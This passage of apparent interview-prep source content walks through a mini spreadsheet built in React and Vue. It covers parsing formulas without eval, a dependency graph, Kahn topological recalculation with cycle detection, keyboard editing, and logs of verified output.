<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Split:</strong> <span style="color:#f0e2c8;">"A framework-free engine with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">update</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">get</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">raw</code>, and a React grid that re-reads it after each commit by bumping a version."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Parse:</strong> <span style="color:#f0e2c8;">"A tokenizer plus a recursive-descent parser builds an AST with the right precedence; evaluation walks the tree, never <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">eval</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Graph:</strong> <span style="color:#f0e2c8;">"On each edit I store what the cell reads and the reverse map of who reads it, removing the old edges first."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Recalculate:</strong> <span style="color:#f0e2c8;">"Collect the dirty set through the reverse map, then Kahn topological sort computes each cell after its inputs."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Cycles and UX:</strong> <span style="color:#f0e2c8;">"Nodes Kahn never reaches are <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">#CYCLE!</code>; editing is Excel-like with type-to-edit, Enter, Tab and Escape."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add absolute references like <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">$A$1</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Teach the tokenizer a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">$</code> prefix on the column or row and keep the flags on the ref node. They only matter for copy and paste, where relative parts shift and absolute parts stay.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you scale to 100,000 cells?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Virtualise the grid rendering, store cells sparsely, keep the incremental recalculation, and move the engine into a Web Worker so long recalculations do not block typing.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you implement undo?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Record each commit as <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">{ id, before, after }</code> raw text on a stack; undo calls <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">update</code> with the before text. The engine stays the source of truth.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why Kahn and not DFS?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Both give a topological order. Kahn finds cycles naturally as leftover nodes and is iterative, so it cannot blow the stack; DFS needs a colour marking to detect back edges.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Table-driven unit tests for the parser and evaluator, graph tests for recalculation order and cycles, then a component test that types into cells and checks displayed values.</span>
</div>

</div>

## 9. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **External mutable store** | State outside React, re-read after a version bump |
| **Tokenizer (lexer)** | Splits text into tokens |
| **Recursive-descent parser** | One function per grammar rule |
| **AST** | The parsed formula as a tree of objects |
| **Dependency graph** | Who reads whom, plus the reverse map |
| **Topological sort (Kahn)** | Process nodes whose inputs are all ready |
| **Cycle detection** | Nodes Kahn never reaches are on a cycle |
| **Lazy ref initialisation** | Create an object once per component instance |

---
**Conclusion:** A mini spreadsheet is a parser, a graph and a sort with a grid on top. Parse each formula once into an AST, record what it reads, and on every edit recalculate only the dirty set in topological order; whatever the sort cannot reach is a cycle. Keep that engine outside React and bump a version to re-render. The verified run shows correct precedence and errors, a five-cell recalculation when one input changes, and a circular reference caught and healed without a stack overflow.`,
        files: {
          "/App.js": `import Spreadsheet from "./src/Spreadsheet";

const css = \`
  body { margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
  .page { max-width: 760px; margin: 0 auto; padding: 20px 16px; }
  .ss-bar { display: flex; gap: 8px; margin-bottom: 8px; }
  .ss-name { min-width: 44px; padding: 6px 8px; border: 1px solid #2c3340; border-radius: 6px; background: #171a21; text-align: center; font: 600 13px ui-monospace, monospace; }
  .ss-bar input { flex: 1; min-width: 0; padding: 6px 8px; border: 1px solid #2c3340; border-radius: 6px; background: #0f1115; color: #e6e6e6; font: 13px ui-monospace, monospace; }
  .ss-scroll { overflow-x: auto; border: 1px solid #2c3340; border-radius: 8px; }
  table { border-collapse: collapse; width: 100%; min-width: 520px; font-size: 13px; }
  th { background: #171a21; color: #8b949e; font-weight: 500; padding: 4px 6px; border: 1px solid #262c36; }
  td { border: 1px solid #262c36; padding: 0 6px; height: 28px; min-width: 80px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 120px; cursor: cell; }
  td.num { text-align: right; font-variant-numeric: tabular-nums; }
  td.err { color: #ff8a80; }
  td.sel { outline: 2px solid #f9a825; outline-offset: -2px; background: #1c140a; }
  td input { width: 100%; box-sizing: border-box; border: 0; background: #1c140a; color: #ffe0b2; font: 13px ui-monospace, monospace; outline: none; padding: 4px 0; }
  .ss-status { font-size: 13px; color: #9aa4b2; }
\`;

export default function App() {
  return (
    <main className="page">
      <style>{css}</style>
      <h1 style={{ fontSize: 18 }}>Budget</h1>
      <Spreadsheet />
    </main>
  );
}
`,
          "/src/engine.js": `// A tiny spreadsheet engine: tokenizer -> recursive-descent parser -> AST,
// a dependency graph, and recalculation in topological order. No eval().
export const COLS = ["A", "B", "C", "D", "E"];
export const ROWS = 8;
const FUNCS = {
  SUM: (xs) => xs.reduce((a, b) => a + b, 0),
  AVERAGE: (xs) =>
    xs.length ? xs.reduce((a, b) => a + b, 0) / xs.length : err("#DIV/0!"),
  MIN: (xs) => (xs.length ? Math.min(...xs) : 0),
  MAX: (xs) => (xs.length ? Math.max(...xs) : 0),
};

export const err = (code) => ({ error: code });
export const isErr = (v) => v !== null && typeof v === "object" && "error" in v;
const isDigit = (c) => c >= "0" && c <= "9";
const isLetter = (c) => c >= "A" && c <= "Z";

// "B12" -> { c: 1, r: 11 }, or null when it is not a cell inside the grid.
export function splitRef(id) {
  let i = 0;
  while (i < id.length && isLetter(id[i])) i++;
  const c = COLS.indexOf(id.slice(0, i)),
    r = Number(id.slice(i)) - 1;
  return i > 0 &&
    i < id.length &&
    c >= 0 &&
    Number.isInteger(r) &&
    r >= 0 &&
    r < ROWS
    ? { c, r }
    : null;
}

function tokenize(src) {
  const out = [];
  let i = 0;
  while (i < src.length) {
    const ch = src[i];
    if (ch === " ") {
      i++;
      continue;
    }
    if (isDigit(ch) || ch === ".") {
      let j = i;
      while (j < src.length && (isDigit(src[j]) || src[j] === ".")) j++;
      const n = Number(src.slice(i, j));
      if (Number.isNaN(n)) throw err("#ERROR!");
      out.push({ t: "num", v: n });
      i = j;
      continue;
    }
    if (isLetter(ch.toUpperCase())) {
      let j = i;
      while (
        j < src.length &&
        (isLetter(src[j].toUpperCase()) || isDigit(src[j]))
      )
        j++;
      const word = src.slice(i, j).toUpperCase();
      out.push({ t: isDigit(word[word.length - 1]) ? "ref" : "name", v: word });
      i = j;
      continue;
    }
    if ("+-*/(),:".includes(ch)) {
      out.push({ t: ch });
      i++;
      continue;
    }
    throw err("#ERROR!");
  }
  return out;
}

// Grammar: expr := term (("+" | "-") term)* term := unary (("*" | "/") unary)*
// unary := "-" unary | atom atom := num | ref | ref ":"
// ref | name "(" args ")" | "(" expr ")"
export function parse(src) {
  const toks = tokenize(src);
  let p = 0;
  const peek = () => toks[p]?.t;
  const eat = (t) => {
    if (peek() !== t) throw err("#ERROR!");
    return toks[p++];
  };
  function expr() {
    let node = term();
    while (peek() === "+" || peek() === "-")
      node = { t: "bin", op: toks[p++].t, l: node, r: term() };
    return node;
  }
  function term() {
    let node = unary();
    while (peek() === "*" || peek() === "/")
      node = { t: "bin", op: toks[p++].t, l: node, r: unary() };
    return node;
  }
  function unary() {
    if (peek() === "-") {
      p++;
      return { t: "neg", e: unary() };
    }
    if (peek() === "+") {
      p++;
      return unary();
    }
    return atom();
  }
  function atom() {
    const tok = toks[p];
    if (!tok) throw err("#ERROR!");
    if (tok.t === "num") {
      p++;
      return { t: "num", v: tok.v };
    }
    if (tok.t === "ref") {
      p++;
      if (peek() === ":") {
        p++;
        return { t: "range", from: tok.v, to: eat("ref").v };
      }
      return { t: "ref", id: tok.v };
    }
    if (tok.t === "name") {
      p++;
      eat("(");
      const args = [];
      if (peek() !== ")") {
        args.push(expr());
        while (peek() === ",") {
          p++;
          args.push(expr());
        }
      }
      eat(")");
      return { t: "fn", name: tok.v, args };
    }
    if (tok.t === "(") {
      p++;
      const e = expr();
      eat(")");
      return e;
    }
    throw err("#ERROR!");
  }
  const tree = expr();
  if (p !== toks.length) throw err("#ERROR!");
  return tree;
}

function expand(from, to) {
  const a = splitRef(from),
    b = splitRef(to);
  if (!a || !b) return null;
  const ids = [];
  for (let c = Math.min(a.c, b.c); c <= Math.max(a.c, b.c); c++)
    for (let r = Math.min(a.r, b.r); r <= Math.max(a.r, b.r); r++)
      ids.push(COLS[c] + (r + 1));
  return ids;
}

function refsOf(node, acc = new Set()) {
  if (node.t === "ref") acc.add(node.id);
  else if (node.t === "range")
    (expand(node.from, node.to) || []).forEach((id) => acc.add(id));
  else if (node.t === "bin") {
    refsOf(node.l, acc);
    refsOf(node.r, acc);
  } else if (node.t === "neg") refsOf(node.e, acc);
  else if (node.t === "fn") node.args.forEach((a) => refsOf(a, acc));
  return acc;
}

// Evaluate an AST. get(id) returns the
// current value of a cell. Errors propagate.
function evaluate(node, get) {
  const num = (v) =>
    isErr(v) ? v : v === "" ? 0 : typeof v === "number" ? v : err("#VALUE!");
  switch (node.t) {
    case "num":
      return node.v;
    case "ref":
      return splitRef(node.id) ? num(get(node.id)) : err("#REF!");
    case "neg": {
      const v = evaluate(node.e, get);
      return isErr(v) ? v : -v;
    }
    case "bin": {
      const l = evaluate(node.l, get);
      if (isErr(l)) return l;
      const r = evaluate(node.r, get);
      if (isErr(r)) return r;
      if (node.op === "/" && r === 0) return err("#DIV/0!");
      return node.op === "+"
        ? l + r
        : node.op === "-"
          ? l - r
          : node.op === "*"
            ? l * r
            : l / r;
    }
    case "range":
      return err("#VALUE!"); // a bare range only makes sense inside a function
    case "fn": {
      const fn = FUNCS[node.name];
      if (!fn) return err("#NAME?");
      const xs = [];
      for (const a of node.args) {
        if (a.t === "range") {
          const ids = expand(a.from, a.to);
          if (!ids) return err("#REF!");
          for (const id of ids) {
            const v = get(id);
            if (isErr(v)) return v;
            if (typeof v === "number") xs.push(v);
          } // text and blanks are skipped
        } else {
          const v = evaluate(a, get);
          if (isErr(v)) return v;
          xs.push(v);
        }
      }
      return fn(xs);
    }
  }
  return err("#ERROR!");
}

export function createSheet() {
  const raw = new Map(),
    formula = new Map(),
    deps = new Map(),
    rdeps = new Map(),
    values = new Map();
  const get = (id) => (values.has(id) ? values.get(id) : "");

  function setRaw(id, text) {
    // drop old edges
    for (const d of deps.get(id) || []) rdeps.get(d)?.delete(id);
    raw.set(id, text);
    let refs = new Set();
    if (text.startsWith("=")) {
      try {
        const tree = parse(text.slice(1));
        formula.set(id, tree);
        refs = refsOf(tree);
      } catch (e) {
        formula.set(id, isErr(e) ? e : err("#ERROR!"));
      }
    } else formula.delete(id);
    deps.set(id, refs);
    for (const d of refs) {
      if (!rdeps.has(d)) rdeps.set(d, new Set());
      rdeps.get(d).add(id);
    }
  }

  function compute(id) {
    const f = formula.get(id),
      text = raw.get(id) || "";
    if (!f)
      values.set(
        id,
        text.trim() === ""
          ? ""
          : Number.isNaN(Number(text))
            ? text
            : Number(text),
      );
    else values.set(id, isErr(f) ? f : evaluate(f, get));
  }

  // Apply edits, then recalculate only the edited
  // cells and everything downstream of them.
  // Returns the recalculation order, which is what the UI shows.
  function update(changes) {
    for (const [id, text] of Object.entries(changes)) setRaw(id, text);
    const dirty = new Set(),
      stack = Object.keys(changes);
    while (stack.length) {
      const id = stack.pop();
      if (dirty.has(id)) continue;
      dirty.add(id);
      for (const d of rdeps.get(id) || []) stack.push(d);
    }
    // Kahn topological sort restricted to the dirty set.
    const indeg = new Map(
      [...dirty].map((id) => [
        id,
        [...(deps.get(id) || [])].filter((d) => dirty.has(d)).length,
      ]),
    );
    const queue = [...dirty].filter((id) => indeg.get(id) === 0).sort();
    const order = [];
    while (queue.length) {
      const id = queue.shift();
      order.push(id);
      compute(id);
      for (const d of [...(rdeps.get(id) || [])].sort()) {
        if (!dirty.has(d)) continue;
        indeg.set(d, indeg.get(d) - 1);
        if (indeg.get(d) === 0) queue.push(d);
      }
    }
    // Whatever never reached in-degree 0 is on a cycle or downstream of one.
    const stuck = [...dirty].filter((id) => !order.includes(id)).sort();
    for (const id of stuck) values.set(id, err("#CYCLE!"));
    return { order, cycle: stuck };
  }

  return { update, get, raw: (id) => raw.get(id) || "" };
}

export function display(v) {
  if (isErr(v)) return v.error;
  // 0.1+0.2 shows 0.3
  if (typeof v === "number") return String(Number(v.toFixed(10)));
  return v;
}

export const SAMPLE = {
  A1: "Rent",
  B1: "1200",
  A2: "Food",
  B2: "450.50",
  A3: "Travel",
  B3: "180",
  A4: "Total",
  B4: "=SUM(B1:B3)",
  C1: "=B1/B4",
  D1: "=B1*12",
  A6: "Tax rate",
  B6: "0.2",
  B7: "=B4*B6",
  C4: "=MAX(B1:B3)-MIN(B1:B3)",
};
`,
          "/src/Spreadsheet.js": `import { useEffect, useRef, useState } from "react";
import {
  COLS,
  ROWS,
  SAMPLE,
  createSheet,
  display,
  isErr,
  splitRef,
} from "./engine";

const ROW_IDS = Array.from({ length: ROWS }, (_, i) => i + 1);

export default function Spreadsheet() {
  // The engine is a mutable object that lives outside React's state; a version
  // counter tells React when to re-read it. Lazy init: created once.
  const sheetRef = useRef(null);
  if (!sheetRef.current) {
    sheetRef.current = createSheet();
    sheetRef.current.update(SAMPLE);
  }
  const sheet = sheetRef.current;
  const [, setVersion] = useState(0);
  const [selected, setSelected] = useState("A1");
  const [draft, setDraft] = useState(null); // null = not editing
  const [editIn, setEditIn] = useState("cell"); // which editor owns the draft
  const [last, setLast] = useState(null);
  const gridRef = useRef(null);
  const wantFocus = useRef(false);

  useEffect(() => {
    if (!wantFocus.current) return;
    wantFocus.current = false;
    gridRef.current
      ?.querySelector(
        draft !== null && editIn === "cell" ? "input" : '[tabindex="0"]',
      )
      ?.focus();
  });

  function commit(text) {
    setLast(sheet.update({ [selected]: text }));
    setVersion((v) => v + 1);
    setDraft(null);
  }
  function select(id) {
    setSelected(id);
    wantFocus.current = true;
  }
  function move(id, dc, dr) {
    const { c, r } = splitRef(id);
    const nc = Math.min(COLS.length - 1, Math.max(0, c + dc)),
      nr = Math.min(ROWS - 1, Math.max(0, r + dr));
    select(COLS[nc] + (nr + 1));
  }
  function startEdit(text) {
    setDraft(text);
    setEditIn("cell");
    wantFocus.current = true;
  }

  function onCellKey(e) {
    const arrows = {
      ArrowUp: [0, -1],
      ArrowDown: [0, 1],
      ArrowLeft: [-1, 0],
      ArrowRight: [1, 0],
    };
    if (arrows[e.key]) {
      e.preventDefault();
      move(selected, ...arrows[e.key]);
    } else if (e.key === "Enter" || e.key === "F2") {
      e.preventDefault();
      startEdit(sheet.raw(selected));
    } else if (e.key === "Delete" || e.key === "Backspace") {
      e.preventDefault();
      commit("");
    } else if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
      e.preventDefault();
      startEdit(e.key);
    }
  }
  function onEditorKey(e) {
    if (e.key === "Enter") {
      e.preventDefault();
      commit(draft);
      move(selected, 0, 1);
    } else if (e.key === "Tab") {
      e.preventDefault();
      commit(draft);
      move(selected, e.shiftKey ? -1 : 1, 0);
    } else if (e.key === "Escape") {
      e.preventDefault();
      setDraft(null);
      select(selected);
    }
  }
  function onBarKey(e) {
    if (e.key === "Enter" && draft !== null) {
      e.preventDefault();
      commit(draft);
    } else if (e.key === "Escape") {
      e.preventDefault();
      setDraft(null);
    }
  }
  function onCellDown(id) {
    // clicking away commits, like Excel
    if (draft !== null && id !== selected) commit(draft);
    select(id);
  }

  const status = !last
    ? "Edit a cell. Formulas start with =, e.g. =SUM(B1:B3)."
    : last.cycle.length
      ? \`Circular reference: \${last.cycle.join(", ")}\`
      : \`Recalculated: \${last.order.join(" → ")}\`;

  return (
    <div className="ss">
      <div className="ss-bar">
        <span className="ss-name" aria-label="Selected cell">
          {selected}
        </span>
        <input
          aria-label="Formula bar"
          data-testid="bar"
          value={draft !== null ? draft : sheet.raw(selected)}
          onChange={(e) => {
            setDraft(e.target.value);
            setEditIn("bar");
          }}
          onKeyDown={onBarKey}
        />
      </div>
      <div className="ss-scroll">
        <table role="grid" aria-label="Spreadsheet" ref={gridRef}>
          <thead>
            <tr>
              <th aria-hidden="true" />
              {COLS.map((c) => (
                <th key={c} scope="col">
                  {c}
                </th>
              ))}
            </tr>
          </thead>
          <tbody>
            {ROW_IDS.map((r) => (
              <tr key={r}>
                <th scope="row">{r}</th>
                {COLS.map((c) => {
                  const id = c + r,
                    v = sheet.get(id),
                    isSel = id === selected;
                  const editing = isSel && draft !== null && editIn === "cell";
                  return (
                    <td
                      key={id}
                      data-cell={id}
                      tabIndex={isSel ? 0 : -1}
                      aria-selected={isSel}
                      className={
                        (isSel ? "sel " : "") +
                        (isErr(v) ? "err " : "") +
                        (typeof v === "number" ? "num" : "")
                      }
                      onMouseDown={() => onCellDown(id)}
                      onDoubleClick={() => startEdit(sheet.raw(id))}
                      onKeyDown={editing ? undefined : onCellKey}
                    >
                      {editing ? (
                        <input
                          aria-label={\`Edit \${id}\`}
                          value={draft}
                          onChange={(e) => setDraft(e.target.value)}
                          onKeyDown={onEditorKey}
                        />
                      ) : (
                        display(v)
                      )}
                    </td>
                  );
                })}
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <p className="ss-status" role="status" data-testid="status">
        {status}
      </p>
    </div>
  );
}
`,
        },
      },
      vue: {
        answer: `**Target Audience:** Vue developers preparing for a machine coding round. Assumes \`<script setup>\`, \`ref\`, \`computed\` and \`v-model\`.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: the formula engine in Node 22, and this Vue 3.5.44 component mounted in jsdom and driven by a script.

## 1. Why This Even Matters — A Story First

A family budget lives in a spreadsheet: rent, food and travel in column B, a total underneath, and a tax line that multiplies the total. Change food from 450.50 to 500 and four other cells must change too, in the right order, without anyone pressing "refresh". Type a formula that points back at itself and the sheet must say so instead of freezing. That is the whole question: a parser that never calls \`eval\`, a dependency graph, a recalculation order, and cycle detection. The Vue grid on top is the easy part.

## 2. Plan and the Vue State Model

The engine is framework-free (the same file runs under React and, typed, under Angular): \`createSheet()\` returns \`{ update(changes), get(id), raw(id) }\`. The component keeps only UI state.

| Piece | Vue tool | Notes |
| :--- | :--- | :--- |
| \`sheet\` | \`markRaw(createSheet())\` | Plain mutable engine with Maps inside. |
| \`version\` | \`ref(0)\` | Bumped after every commit; read inside the computeds. |
| \`rows\`, \`barValue\`, \`status\` | \`computed\` | What the template shows. |
| \`selected\`, \`draft\`, \`editIn\`, \`last\` | \`ref\` | Selected cell, edit text (\`null\` = not editing), which editor owns it, last recalculation. |

📌 **Interview term: markRaw** — tells Vue never to wrap an object in a reactive proxy. The engine mutates its own Maps thousands of times during a recalculation; proxying them would track every read for nothing ([markRaw and toRaw](/interview-question/what-do-markraw-and-toraw-do)).

📌 **Interview term: Version counter** — because the engine is not reactive, Vue cannot see its changes. A \`version\` ref that the computeds read, and that \`commit\` increments, is the signal that "the engine changed, read it again":

\`\`\`js
const sheet = markRaw(createSheet());
sheet.update(SAMPLE);
const version = ref(0);
const rows = computed(() => {
  version.value; // dependency: re-run after every commit
  return ROW_IDS.map((r) =>
    COLS.map((c) => ({ id: c + r, v: sheet.get(c + r) })),
  );
});
function commit(text) {
  last.value = sheet.update({ [selected.value]: text });
  version.value++;
  draft.value = null;
}
\`\`\`

The same idea as \`triggerRef\` on a \`shallowRef\`, made explicit ([shallowRef and triggerRef](/interview-question/when-should-you-use-shallowref-shallowreactive-triggerref)).

## 3. Build It Step by Step

### 3.1 Tokenizer and recursive-descent parser

The tokenizer turns \`SUM(B1:B3)*2\` into \`num\`, \`ref\`, \`name\` and single-character tokens (\`+ - * / ( ) , :\`); anything else, such as \`^\`, throws. The parser has one function per precedence level:

\`\`\`js
// expr  := term (("+" | "-") term)*
// term  := unary (("*" | "/") unary)*
// unary := "-" unary | atom
// atom  := num | ref | ref ":" ref | name "(" args ")" | "(" expr ")"
\`\`\`

Each returns an AST node such as \`{ t: "bin", op: "*", l, r }\`. Anything the grammar does not allow (\`=1+\`, \`=2^3\`) throws, and the cell shows \`#ERROR!\`.

📌 **Interview term: Recursive descent** — a parser written as mutually recursive functions, one per grammar rule; precedence falls out of which function calls which.

### 3.2 Why not \`eval\`

\`eval\` or \`new Function\` would run whatever a user (or a shared sheet) typed, with full access to the page. A grammar can only build the nodes it knows: numbers, refs, four operators and a whitelist of functions (\`SUM\`, \`AVERAGE\`, \`MIN\`, \`MAX\`). It is also the only way to get cell references out of a formula reliably, which the dependency graph needs.

### 3.3 Evaluation and errors

\`evaluate(node, get)\` walks the tree. Errors are values (\`{ error: "#DIV/0!" }\`) that propagate: any operation on an error returns that error. Text in arithmetic gives \`#VALUE!\`, an unknown function \`#NAME?\`, a ref outside A1:E8 \`#REF!\`. Ranges in functions skip blanks and text, as Excel does.

### 3.4 The dependency graph and recalculation

\`setRaw\` stores two maps per cell: \`deps\` (what this formula reads) and \`rdeps\` (who reads this cell), dropping the old edges first. \`update(changes)\` then:

1. collects the **dirty set**: the edited cells plus everything reachable through \`rdeps\`;
2. runs **Kahn's algorithm** on that set only: in-degree = number of dirty cells it depends on; repeatedly compute a cell whose in-degree is 0 and decrement its readers;
3. marks every dirty cell that never reached in-degree 0 as \`#CYCLE!\`, and returns \`{ order, cycle }\`.

📌 **Interview term: Topological order** — an order where every cell comes after the cells it reads. Kahn's algorithm produces one, and whatever it cannot order is on a cycle or downstream of one, so cycle detection is free.

Editing B2 recalculates B2, B4, C4, B7 and C1: five cells, not the whole sheet.

### 3.5 Two editors, one draft

Excel has two places to type: the cell itself and the formula bar. Both edit one \`draft\` ref; \`editIn\` says which one shows the input.

\`\`\`vue
<td
  v-for="cellItem in row"
  :key="cellItem.id"
  :data-cell="cellItem.id"
  :tabindex="cellItem.id === selected ? 0 : -1"
  :aria-selected="cellItem.id === selected"
  :class="cellClass(cellItem)"
  @mousedown="onCellDown(cellItem.id)"
  @dblclick="startEdit(sheet.raw(cellItem.id))"
  @keydown="onCellKey"
>
  <input v-if="editingHere(cellItem.id)" :aria-label="\`Edit \${cellItem.id}\`"
    v-model="draft" @keydown.stop="onEditorKey" />
  <template v-else>{{ display(cellItem.v) }}</template>
</td>
\`\`\`

On a selected cell: arrows move, Enter or F2 edit the raw text, Delete clears, a printable key starts editing with that character. In the editor: Enter commits and moves down, Tab commits and moves right, Escape discards.

📌 **Interview term: Event modifiers** — \`@keydown.stop\` calls \`stopPropagation()\`, so arrow keys typed in the editor move the text caret and never reach the cell handler that would move the selection ([event modifiers](/interview-question/how-do-you-handle-events-in-vue-v-on-and-event-modifiers)).

### 3.6 Focus after render

Moving the selection changes which \`<td>\` has \`tabindex="0"\`, and starting an edit creates an \`<input>\` that does not exist yet. Both are focused after Vue patches the DOM:

\`\`\`js
async function focusLater() {
  await nextTick();
  grid.value
    ?.querySelector(
      draft.value !== null && editIn.value === "cell"
        ? "input"
        : '[tabindex="0"]',
    )
    ?.focus();
}
\`\`\`

📌 **Interview term: nextTick** — waits for the pending DOM update to flush ([nextTick](/interview-question/what-is-nexttick-in-vue)).

## 4. Verified

The engine in Node 22 (the typed Angular port printed identical lines):

\`\`\`text
load order: A1 A2 A3 A4 A6 B1 B2 B3 B6 D1 B4 C4 B7 C1
B4=1830.5  C1=0.6555585905  D1=14400  B7=366.1  C4=1020
B2=500 -> recalculated: B2 B4 C4 B7 C1 | B4=1880  C1=0.6382978723  B7=376  C4=1020
=1+2*3 -> 7 | =(1+2)*3 -> 9 | =-2*-3 -> 6 | =10/4-1 -> 1.5 | =0.1+0.2 -> 0.3 | =SUM(B3:B1)+AVERAGE(1,2,3) -> 1882 | =1/0 -> #DIV/0! | =FOO(1) -> #NAME?
=1+ -> #ERROR! | =A1+1 -> #VALUE! | =Z9 -> #REF! | =SUM(A1:A9) -> #REF! | =2^3 -> #ERROR! | =E7+1 -> #DIV/0!
cycle C6->C7->C8->C6: order (none) | stuck C6 C7 C8 | C6=#CYCLE!  C7=#CYCLE!  C8=#CYCLE!
C8=5 -> recalculated: C8 C7 C6 | C6=11  C7=10  C8=5
self ref: C5=#CYCLE!
\`\`\`

The component in jsdom (Vue 3.5.44), driven by keyboard and formula-bar input. React and Angular printed the same lines:

\`\`\`text
loaded: B1=1200 B2=450.5 B3=180 B4=1830.5 C1=0.6555585905 D1=14400 B7=366.1 C4=1020
select B4 -> bar: =SUM(B1:B3) | focus: B4
bar B2=500 -> Recalculated: B2 → B4 → C4 → B7 → C1 | B4=1880 C1=0.6382978723 B7=376
ArrowDown -> focus: B3
type 9 -> editor: Edit B3 value 9
Enter -> Recalculated: B3 → B4 → C4 → B7 → C1 | B3=90 B4=1790 | focus: B4
edit A1, Escape -> A1=Rent | focus: A1
C6 =C7+1, C7 =C6*2 -> Circular reference: C6, C7 | C6=#CYCLE! C7=#CYCLE!
C7 =5 -> Recalculated: C7 → C6 | C6=6 C7=5
errors: D2=#DIV/0! D3=#NAME? D4=#VALUE! D5=#ERROR! D6=0.3
Delete D4 -> D4= | Recalculated: D4
E1 via Tab -> E1=3580 | focus: E1
\`\`\`

\`0.1+0.2\` displays \`0.3\` because \`display\` rounds to 10 decimal places; the stored value is still the float. jsdom does not lay out the table, so column widths and colours were not checked.

## 5. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Cycles, including self-reference | Kahn leftovers become \`#CYCLE!\`; fixing one cell recomputes the loop |
| Errors inside ranges | Propagate as values |
| Reversed range \`B3:B1\` | Normalised |
| Formula injection | No \`eval\`; only whitelisted nodes exist |
| Keyboard | \`role="grid"\`, roving \`tabindex\`, Excel-style keys |
| Status | \`role="status"\` announces the recalculation order or the cycle |

## 6. Common Pitfalls

- **Making the engine deeply reactive.** Vue proxies every Map and tracks every read inside a recalculation; \`markRaw\` plus a version ref is cheaper and explicit.
- **Forgetting to read \`version\` in a computed.** It caches the old grid forever.
- **Recalculating the whole sheet in row order.** C1 would read B4 before B4 is updated; order by dependencies.
- **Recursing into references to detect cycles.** A cycle overflows the stack; Kahn leftovers find it without recursion.
- **No \`.stop\` on the editor keydown.** ArrowLeft in the input moves the selection instead of the caret.

## 7. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
